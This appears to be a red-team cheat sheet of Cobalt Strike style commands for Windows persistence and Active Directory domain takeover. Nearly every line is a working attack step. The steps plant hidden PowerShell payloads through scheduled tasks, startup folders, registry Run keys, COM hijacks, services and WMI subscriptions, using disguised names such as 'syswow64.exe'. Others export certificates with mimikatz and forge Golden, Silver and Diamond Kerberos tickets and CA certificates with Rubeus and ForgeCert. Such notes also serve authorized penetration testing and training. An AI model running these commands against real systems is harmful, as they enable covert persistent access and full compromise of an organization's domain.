[[#PowerShell Payload (base64)]]
`execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -n "Updater" -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc [base64]" -m add -o hourly`

Remove
`execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -n "Updater" -m remove`
#### Startup Folder
[[#PowerShell Payload (base64)]]
`execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -f "UserEnvSetup" -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc [base64]" -m add`

Remove
`execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -f "UserEnvSetup" -m remove`
#### Registry AutoRun
`cd C:\ProgramData`
`upload C:\Payloads\http_x64.exe`
`mv http_x64.exe updater.exe`
`execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -k "hkcurun" -v "Updater" -c "C:\ProgramData\updater.exe" -a "/q /n" -m add`

Remove
`execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -k "hkcurun" -v "Updater" -m remove`
#### COM Hijacks

Hunt Processes
In Process Monitor Filter,
- *Operation* is *RegOpenKey*
- *Result* is *NAME NOT FOUND*
- *Path* ends with *InprocServer32*
Launch random applications to generate events

Hunt Scheduled Tasks
```powershell
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks) {
	if ($Task.Actions.ClassId -ne $null) {
		if ($Task.Triggers.Enabled -eq $true) {
			if ($Task.Principal.GroupId -eq "Users") {
				Write-Host "Task Name: " $Task.TaskName
				Write-Host "Task Path: " $Task.TaskPath
				Write-Host "CLSID: " $Task.Actions.ClassId
				Write-Host
			}
		}
	}
}
```
In Task Scheduler, check Triggers for TaskName
`Get-ChildItem -Path "Registry::HKCR\CLSID\{[clsid]}"`→ confirm Name is InprocServer32

COM Hijack
`Get-Item -Path "HKLM:[path]"`→ this path probably exists
`Get-Item -Path "HKCU:[path]"`→ ensure this path does not exist
`New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{[clsid]}"`
`New-Item -Path "HKCU:Software\Classes\CLSID\{[clsid]}" -Name "InprocServer32" -Value "[payload].dll"`
`New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{[clsid]}\InprocServer32" -Name "ThreadingModel" -Value Both`
**Note:** change Software\\Classes\\CLSID to match path as necessary

Remove
`Remove-Item -Path "HKCU:Software\Classes\CLSID" -Name "{[clsid]}"`
`rm [payload].dll`
#### Certificate
`execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates`→ check for "Certificate is used for client authentication!"
if no cert found: `execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:[ca] /template:User`
`mimikatz crypto::certificates /export`
`download [cert].pfx`

`cat /mnt/c/Users/Attacker/Desktop/[cert].pfx | base64 -w 0`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:[user] /certificate:[base64] /password:mimikatz /enctype:aes256 /opsec /nowrap`
[[#Pass-the-Ticket]]
## Host Persistence (System)

`cd C:\Windows`
`upload C:\Payloads\local_x64.svc.exe`
`mv local_x64.svc.exe syswow64.exe`

`cd C:\Windows`
`upload C:\Payloads\smb_x64.svc.exe`
`mv smb_x64.svc.exe syswow64.exe`
#### Windows Services
`execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -n "SysWOW64" -c "C:\Windows\syswow64.exe" -m add`

Remove
`execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -n "SysWOW64" -m remove`
#### WMI Event Subscription
`powershell-import C:\Tools\PowerLurk.ps1`
`powerpick Register-MaliciousWmiEvent -EventName SysWOW64 -PermanentCommand "C:\Windows\syswow64.exe" -Trigger ProcessStart -ProcessName [process]`
`powerpick Register-MaliciousWmiEvent -EventName SysWOW64 -PermanentCommand "C:\Windows\syswow64.exe" -Trigger UserLogon -UserName *`

Remove
`powershell Get-WmiEvent -Name SysWOW64 | Remove-WmiObject`
#### Certificate
`execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates`→ check for "Certificate is used for client authentication!"
if no cert found: `execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:[ca] /template:Machine /machine`
`mimikatz !crypto::certificates /systemstore:local_machien /export`
`download [cert].pfx`

`cat /mnt/c/Users/Attacker/Desktop/[cert].pfx | base64 -w 0`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:[machine]$ /certificate:[base64] /password:mimikatz /enctype:aes256 /opsec /nowrap`
[[#Pass-the-Ticket]]
## Domain Dominance
`powerpick Get-Domain`
`powerpick Get-DomainSID`
#### Silver Ticket
forge TGS for any user to any service on that machine
- requires machine hash

see [[#Service Tickets]]
`C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /aes256:[hash] /service:[service]/[host] /user:[any user] /domain:[domain] /sid:[domain sid] /nowrap`
[[#Pass-the-Ticket]]
#### Golden Ticket
forge TGT for any user to access any service on any machine
- requires krbtgt hash

`C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:[hash] /user:[any user] /domain:[domain] /sid:[domain sid] /nowrap`
[[#Pass-the-Ticket]]
#### Diamond Ticket
request TGT for any user to access any service on any machine
- requires krbtgt hash

`powershell Get-ADUser -Identity "[user]" | Select SID`→ RID is last section of SID
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /krbkey:[aes256 hash] /tgtdeleg /ticketuser:[any user] /ticketuserid:[user rid] /groups:512 /nowrap`
[[#Pass-the-Ticket]]
#### Forged Certificate
on CA, `execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine`
copy certificate (both private key and certificate) to ca.pem
`openssl pkcs12 -in ca.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ca.pfx`

`C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "[any user]@[domain]" --NewCertPath cert.pfx --NewCertPassword pass123`

`cat cert.pfx | base64 -w 0`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:[user] /domain:[domain] /certificate:[base64] /password:pass123 /enctype:aes256 /opsec /nowrap`
#### GPO
[[#Create and Link a GPO]]
